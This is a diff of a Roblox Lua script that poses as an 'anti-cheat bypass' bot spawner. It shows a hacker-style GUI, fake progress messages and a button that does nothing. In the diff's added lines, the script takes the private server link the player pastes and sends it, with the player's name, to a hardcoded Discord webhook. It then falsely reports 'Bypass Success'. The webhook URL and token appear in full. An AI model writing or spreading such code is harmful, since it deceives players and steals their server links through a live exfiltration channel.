@@ -1,4 +1,4 @@
--- Auto-Moreira_Methodv2.lua
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local SoundService = game:GetService("SoundService")
@@ -22,7 +22,7 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 MainFrame.BackgroundTransparency = 0.1
 MainFrame.Parent = ScreenGui
 
--- Matrix Background Effect
+-- Matrix Rain Background
 local MatrixLabel = Instance.new("TextLabel")
 MatrixLabel.Size = UDim2.new(1, 0, 1, 0)
 MatrixLabel.Text = string.rep("0101 ", 1000)
@@ -35,12 +35,12 @@ MatrixLabel.Font = Enum.Font.Code
 MatrixLabel.Parent = MainFrame
 spawn(function()
     while true do
-        MatrixLabel.Text = string.sub(MatrixLabel.Text, 2) .. (math.random(0, 1) == 0 and "0" or "1")
+        MatrixLabel.Text = string.sub(MatrixLabel.Text, 2) .. (math.random(0,1) == 0 and "0" or "1")
         wait(0.05)
     end
 end)
 
--- Title for Main GUI
+-- Title
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
 TitleLabel.Position = UDim2.new(0.3, 0, 0.1, 0)
@@ -60,7 +60,6 @@ SpawnBotButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 SpawnBotButton.Parent = MainFrame
 SpawnBotButton.MouseButton1Click:Connect(function()
     ClickSound:Play()
-    -- Does nothing
 end)
 
 -- Input Button
@@ -125,7 +124,7 @@ LoadingFrame.Parent = ScreenGui
 local LoadingText = Instance.new("TextLabel")
 LoadingText.Size = UDim2.new(0.6, 0, 0.3, 0)
 LoadingText.Position = UDim2.new(0.2, 0, 0.3, 0)
-LoadingText.Text = "Initializing Anti-Cheat Bypass... Estimated Time: 4m"
+LoadingText.Text = "Initializing Bypass... Estimated Time: 4m"
 LoadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
 LoadingText.BackgroundTransparency = 1
 LoadingText.TextScaled = true
@@ -142,46 +141,50 @@ ProgressBar.Size = UDim2.new(0, 0, 1, 0)
 ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
 ProgressBar.Parent = ProgressBarFrame
 
--- Input Button Logic
+-- Button Logic
 InputButton.MouseButton1Click:Connect(function()
     ClickSound:Play()
     InputFrame.Visible = true
     ErrorLabel.Text = ""
 end)
 
--- Send Button Logic
 SendButton.MouseButton1Click:Connect(function()
     ClickSound:Play()
     local link = TextBox.Text
     if link == "" or link == "Paste Private Server Link Here" then
-        ErrorLabel.Text = "Error: Please enter a valid private server link!"
+        ErrorLabel.Text = "Enter a valid link!"
         return
     end
     InputFrame.Visible = false
     LoadingFrame.Visible = true
+
     local messages = {
         "Grabbing bot... ykkkk",
-        "Cracking anti-cheat encryption... ykkkk",
-        "Injecting bypass payload to server...",
-        "Spoofing client handshake protocols...",
-        "Finalizing exploit, hold the line! ykkkk"
+        "Cracking anti-cheat... ykkkk",
+        "Injecting payload...",
+        "Spoofing protocols...",
+        "Finalizing... ykkkk"
     }
+
     for i, msg in ipairs(messages) do
         LoadingText.Text = msg .. "\nEstimated Time: " .. (4 - i * 0.8) .. "m"
-        ProgressBar.Size = UDim2.new(i / 5, 0, 1, 0)
+        ProgressBar.Size = UDim2.new(i/5, 0, 1, 0)
         wait(48)
     end
+
     local data = {
-        content = "Private Server Link: " .. link .. "\nSent by: " .. LocalPlayer.Name .. "\nAnti-Cheat Bypass Attempt (Moreira Method)"
+        content = "Private Server Link: " .. link .. "\nUser: " .. LocalPlayer.Name .. "\nMethod: Moreira Bypass"
     }
-    local success, err = pcall(function()
+
+    local success = pcall(function()
         HttpService:PostAsync("https://discord.com/api/webhooks/1432521671457374298/mETYE-pr_bqhckpfkxnj9c4wsQOVfCF58YKE6UjEn1TeGaPct-RbEdYnrk_vUYGbUUwa", HttpService:JSONEncode(data))
     end)
+
     if success then
-        LoadingText.Text = "Bypass successful! Bot deployed, ykkkk!"
+        LoadingText.Text = "Bypass Success! Bot Deployed! ykkkk"
         SuccessSound:Play()
     else
-        LoadingText.Text = "Error in bypass: " .. tostring(err)
+        LoadingText.Text = "Failed. Try again."
     end
     ProgressBar.Size = UDim2.new(1, 0, 1, 0)
     wait(2)
